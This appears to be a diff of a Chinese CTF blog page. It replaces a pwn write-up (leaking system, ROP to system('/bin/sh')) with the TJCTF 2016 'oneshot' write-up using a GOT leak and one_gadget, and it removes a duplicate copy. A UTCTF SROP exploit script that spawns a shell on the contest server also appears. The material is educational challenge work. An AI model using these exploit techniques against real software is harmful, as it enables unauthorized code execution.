-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">io = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./tvstation&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6_x64&quot;&#125;)</span><br></pre></td></tr></table></div></figure>
+<p>查看反汇编代码后发现会有这么一串代码，v4是我们输入的东西，却被以函数形式调用。在汇编窗口中看下，发现call puts函数之后的代码形式是这样的。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">var_8 = qword ptr -8</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">mov  rax, [rbp+var_8]</span><br><span class="line">mov  rdx, rax</span><br><span class="line">mov  eax, 0</span><br><span class="line">call rdx</span><br></pre></td></tr></table></div></figure>
 
-<p>2.然后开始分析文件，常规checksec，开了NX，IDA打开文件找漏洞，发现输入4进入debug函数后可以泄露system的内存地址：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">v0 = dlsym((void *)0xFFFFFFFFFFFFFFFFLL, &quot;system&quot;);</span><br><span class="line">sprintf(fmsg, info, v0);</span><br><span class="line">v1 = strlen(fmsg);</span><br><span class="line">write(1, fmsg, v1);</span><br></pre></td></tr></table></div></figure>
+<p>也就是把我们输入的保存在var_8里的内容，给了rax,rax又给了rdx，之后call rdx。也就是我们输入的东西最后会被当初代码指令来执行。</p>
+<p>2.程序不存在栈溢出，输入只能是4个字节，已经规定好了。%ld代表long int，四个字节，程序又没有一次getshell的后门函数，所以就只能靠这4个字节来getshell。</p>
+<p>3.这里考虑使用one gadget RCE来一步getshell，首先在Linux下查找一下题目给的libc中有没有onegadget:</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550001.jpeg" alt="img"></p>
+<p>4.这样就可以通过一次跳转来getshell，但是第一条有限制条件，由于汇编代码中在call rdx之前有mov eax,0;即rax就等于0。(eax在64位程序下就是rax的低32位)或者先调试看看能不能满足条件，经过调试发现执行到call rdx时rax = 0，也满足要求，那么就尝试写payload。</p>
+<p>5.本地中首先需要连接到指定的库文件中，可以先在linux中ldd libc库文件来看题目给的库文件是什么版本，之后修改这段代码让process能够连接到指定版本的libc文件。(利用pwndocker，或者自己下个对应版本的ubuntu—docker，然后安装python之类的)</p>
+<p>io = process([‘/glibc/2.24/64/lib/ld-linux-x86-64.so.2’, ‘./tvstation’], env={“LD_PRELOAD”:”./libc.so.6_x64”})</p>
+<p>6.由于不知道onegadget被libc加载进入之后是在什么地址，所以现在还需要泄露一个地址，刚好程序中有两个isoc99_scanf，第一个可以用来输入某个函数.got表中onegadget的地址，然后程序会打印出来该函数真实地址，对应代码为：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">__isoc99_scanf(&quot;%ld&quot;, &amp;v4);</span><br><span class="line">printf(&quot;Value: 0x%016lx\n&quot;, *(_QWORD *)v4);</span><br></pre></td></tr></table></div></figure>
 
-<p>dlsym()的函数原型是</p>
-<p>void* dlsym(void* handle,const char* symbol);</p>
-<p>该函数在&lt;dlfcn.h&gt;文件中,handle是由dlopen打开动态链接库后返回的指针，symbol就是要求获取的函数的名称，函数返回值是void*,指向函数的地址，供调用使用。write函数的fd是1，所以就相当于直接打印在屏幕上，这里涉及linux系统调用号内容，可以直接查linux下的目录/usr/include/asm/中的unistd_32.h和unistd_64.h。</p>
-<p>这段代码的意思就是把指向system函数的指针返回给v0,然后将v0格式化输出给fmsg，之后将fmsg原封不动打印在屏幕上，第一次看到猜不出来可以直接运行该文件试试呗。之后会进入一个debug_func()，这里存在栈溢出：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">__int64 buf; // [rsp+0h] [rbp-20h]</span><br><span class="line">return read(0, &amp;buf, 0xC8uLL);</span><br></pre></td></tr></table></div></figure>
-
-<p>3.现在有了system的内存地址和栈溢出，就差/bin/sh字符串了。这里用IDA打开题目给的libc文件，可以找到bin/sh字符串的地址binsh_libc_addr和system的地址system_libc_addr。所以这就相当于有system的被libc加载的真实地址，那么system的真实system_addr减去system_libc_addr就可以得到Libc被加载进来的首地址libc_start_addr。即现掌握地址：libc_start_addr，system_addr，system_libc_addr，binsh_libc_addr通过计算可得：binsh_addr = system_addr - system_libc_addr + binsh_libc_addr。这不是栈溢出有了，system函数和binsh字符串的真实地址有了，这不直接getshell就完事了吗，闹啥呢，这破题目，没点技术含量。</p>
-<p>4.但程序还是得走走，64位程序，所以需要使用ROPgadget表来查找pop rdi ; ret这个代码所在的地址，也是在Libc中查找到，然后加上libc_start_addr就可得到pop_rdi_addr。</p>
-<p>5.之后计算偏移量，远程调试下进行，payload依次为padding + pop_rdi_addr + binsh_addr + system_addr。</p>
-<p>6.再考虑输入情况：先在Linux下运行，所以能看到需要在接收到”: ”时可以输入4，然后进入到打印system_addr，打印完之后，需要从打印出来的system地址读取进我们设定的system_addr。</p>
-<p>7.由于打印格式是@x0x7ffffff，所以在recvuntil”@x”，之后开始获取打印的system_addr:system_addr = int(io.recv(12), 16)，以十六进制总共读取12位</p>
-<p>8.读取完成system_addr后就可以开始输入payload，之后就可以interactive()。</p>
+<p>但注意输入的格式。由于输入格式为__isoc99_scanf(“%ld”, &amp;v4)中的ld，也就是十进制有符号长整型，(l=long型，d=Decimal也就是十进制)所以我们需要将该地址转化为十进制数然后输入，因为scanf格式规定了，之后打印的格式是%016lx，其中x代表Hexadecimal，也就是16进制，16代表总共输出16位，0代表不足16位则高位补零。(如果不知道可以拿visualstudio测试一下就可以)</p>
+<p>7.所以第一次输入应该为某个函数地址对应的十进制，这里选取setbuf函数，因为setbuf函数刚好在.got.plt表中，同时也从外部引用，在extern也有，十六进制地址为：0x600ae0(这里选用puts,printf,甚至__libc_start_main也行，只要满足在.got.plt表中和extern表中)也就是6294240，即io.sendline(“6294240”)。这样就可以打印出setbuf函数被加载进内存的地址，之后获取这个地址，先接收io.recvuntil(“Value: “)，使得接下来打印的是setbuf的内存地址，之后使用</p>
+<p>setbuf_memory_addr = int(io.recv()[:18], 16)</p>
+<p>表示总共接收18个字符，之后以16进制形式转化位int，10进制形式。这里总共应该会打印18个字符，16+0x，也就是18个。</p>
+<p>8.之后计算偏移量，得到one_gadget_rce在内存中的地址即可：注意要转化为str字串形式发送</p>
+<p>io.sendline(str(setbuf_memory_addr - (setbuf_addr_libc - one_gadget_rce_libc)))</p>
+<p>9.最后io.interactive()即可getshell。</p>
 <p>参考资料：</p>
 <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/UTCTF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">UTCTF赛后复现</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>这次比赛做了两道题之后就没怎么看了，忙其他的去了。这里主要复现一下另一道题，monke。做这道题的时候估计脑子抽风了，居然没看还有一个隐藏选项在IDA中明明白白地显示着，自己居然没发现，导致啥漏洞都找不出来。</p>
@@ -378,31 +403,6 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.update(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">io = remote(&quot;pwn.utctf.live&quot;,9998)</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += p64(0x402000+0x10)</span><br><span class="line">payload += p64(0x402000+0x10) #addr 0x402008</span><br><span class="line">payload += p64(0x401015) #rsp = 0x402020</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">frame_execve = SigreturnFrame() #设置execve的SROP帧，注意计算/bin/sh\x00所在地址</span><br><span class="line">frame_execve.rax = constants.SYS_execve</span><br><span class="line">frame_execve.rdi = 0x402008</span><br><span class="line">frame_execve.rip = 0x40103D #syscall_addr</span><br><span class="line"></span><br><span class="line">payload2 = &quot;&quot;</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;        #0x402008</span><br><span class="line">payload2 += p64(0x402000+0x10)   #0x402010</span><br><span class="line">payload2 += p64(0x401015)        #0x402018</span><br><span class="line">payload2 += p64(0x402000+0x30)   #0x402020</span><br><span class="line">payload2 += &quot;A&quot;*0x10             #0x402028</span><br><span class="line">payload2 += p64(0x40103D)</span><br><span class="line">payload2 += str(frame_execve)    #0x402038</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">#buf = 0x402008</span><br><span class="line">#rsp = 0x402020</span><br><span class="line">#rbp = 0x402010 -&gt;0x402010</span><br><span class="line"></span><br><span class="line">payload3 = payload2[0:8]</span><br><span class="line">payload3 += &quot;\x30\x20\x40\x00\x00\x00\x00&quot;</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
 
 <p>但是这里调试了好一段时间，需要再仔细分析一点，下回争取早点解决类似的题目。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/TJCTF%202016-oneshot/">TJCTF 2016-oneshot</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，只开了NX，然后IDA打开找漏洞。发现找不到什么漏洞，但是有个很奇怪的地方</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">__int64 (__fastcall *v4)(const char *); // [rsp+8h] [rbp-8h]</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">__isoc99_scanf(&quot;%ld&quot;, &amp;v4);</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">return v4(&quot;Good luck!&quot;);</span><br></pre></td></tr></table></div></figure>
-
-<p>查看反汇编代码后发现会有这么一串代码，v4是我们输入的东西，却被以函数形式调用。在汇编窗口中看下，发现call puts函数之后的代码形式是这样的。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">var_8 = qword ptr -8</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">mov  rax, [rbp+var_8]</span><br><span class="line">mov  rdx, rax</span><br><span class="line">mov  eax, 0</span><br><span class="line">call rdx</span><br></pre></td></tr></table></div></figure>
-
-<p>也就是把我们输入的保存在var_8里的内容，给了rax,rax又给了rdx，之后call rdx。也就是我们输入的东西最后会被当初代码指令来执行。</p>
-<p>2.程序不存在栈溢出，输入只能是4个字节，已经规定好了。%ld代表long int，四个字节，程序又没有一次getshell的后门函数，所以就只能靠这4个字节来getshell。</p>
-<p>3.这里考虑使用one gadget RCE来一步getshell，首先在Linux下查找一下题目给的libc中有没有onegadget:</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550001.jpeg" alt="img"></p>
-<p>4.这样就可以通过一次跳转来getshell，但是第一条有限制条件，由于汇编代码中在call rdx之前有mov eax,0;即rax就等于0。(eax在64位程序下就是rax的低32位)或者先调试看看能不能满足条件，经过调试发现执行到call rdx时rax = 0，也满足要求，那么就尝试写payload。</p>
-<p>5.本地中首先需要连接到指定的库文件中，可以先在linux中ldd libc库文件来看题目给的库文件是什么版本，之后修改这段代码让process能够连接到指定版本的libc文件。(利用pwndocker，或者自己下个对应版本的ubuntu—docker，然后安装python之类的)</p>
-<p>io = process([‘/glibc/2.24/64/lib/ld-linux-x86-64.so.2’, ‘./tvstation’], env={“LD_PRELOAD”:”./libc.so.6_x64”})</p>
-<p>6.由于不知道onegadget被libc加载进入之后是在什么地址，所以现在还需要泄露一个地址，刚好程序中有两个isoc99_scanf，第一个可以用来输入某个函数.got表中onegadget的地址，然后程序会打印出来该函数真实地址，对应代码为：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">__isoc99_scanf(&quot;%ld&quot;, &amp;v4);</span><br><span class="line">printf(&quot;Value: 0x%016lx\n&quot;, *(_QWORD *)v4);</span><br></pre></td></tr></table></div></figure>
-
-<p>但注意输入的格式。由于输入格式为__isoc99_scanf(“%ld”, &amp;v4)中的ld，也就是十进制有符号长整型，(l=long型，d=Decimal也就是十进制)所以我们需要将该地址转化为十进制数然后输入，因为scanf格式规定了，之后打印的格式是%016lx，其中x代表Hexadecimal，也就是16进制，16代表总共输出16位，0代表不足16位则高位补零。(如果不知道可以拿visualstudio测试一下就可以)</p>
-<p>7.所以第一次输入应该为某个函数地址对应的十进制，这里选取setbuf函数，因为setbuf函数刚好在.got.plt表中，同时也从外部引用，在extern也有，十六进制地址为：0x600ae0(这里选用puts,printf,甚至__libc_start_main也行，只要满足在.got.plt表中和extern表中)也就是6294240，即io.sendline(“6294240”)。这样就可以打印出setbuf函数被加载进内存的地址，之后获取这个地址，先接收io.recvuntil(“Value: “)，使得接下来打印的是setbuf的内存地址，之后使用</p>
-<p>setbuf_memory_addr = int(io.recv()[:18], 16)</p>
-<p>表示总共接收18个字符，之后以16进制形式转化位int，10进制形式。这里总共应该会打印18个字符，16+0x，也就是18个。</p>
-<p>8.之后计算偏移量，得到one_gadget_rce在内存中的地址即可：注意要转化为str字串形式发送</p>
-<p>io.sendline(str(setbuf_memory_addr - (setbuf_addr_libc - one_gadget_rce_libc)))</p>
-<p>9.最后io.interactive()即可getshell。</p>
-<p>参考资料：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 </div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/5/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/7/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
   var isXML = true;
   var search_path = 'search.json';
